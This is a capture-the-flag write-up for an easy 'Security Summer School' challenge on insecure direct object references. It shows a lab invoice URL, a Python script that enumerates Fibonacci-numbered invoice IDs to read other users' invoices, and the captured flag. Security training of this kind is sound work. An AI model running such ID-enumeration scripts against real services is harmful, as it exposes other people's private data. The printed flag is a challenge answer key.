---
Name: "Mind your own business"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Testing insecure direct object references to access another user’s data."
---

# Mind your own business
We purchase something and get redirected to the invoice

```http
http://141.85.224.101:30019/invoice.php?invoice=7
```

This endpoint is vulnerable to IDOR, we can view invoice=1,2,3 even though they are not ours

We test some ids and see that the ones that work are 1,2,3,5,8,13, which are part of the fibonacci sequence

We then write a python script to test fibonacci numbers until one is successful
```python
import requests
import re

URL = "http://141.85.224.101:30019/invoice.php?invoice="

fibo1 = 1
fibo2 = 1

while True:
    fibo3 = fibo1 + fibo2 
    fibo1 = fibo2
    fibo2 = fibo3

    print(f"Testing for {fibo3}")
    new_url = URL + str(fibo3)
    
    r = requests.get(url = new_url)
    
    match = re.search(r'SSS\{.*?\}', r.text)

    if match:
        flag = match.group(0)
        print(flag)
        break
```

```txt
SSS{1ts_n0t_nic3_t0_sn00p_ar0und}
```


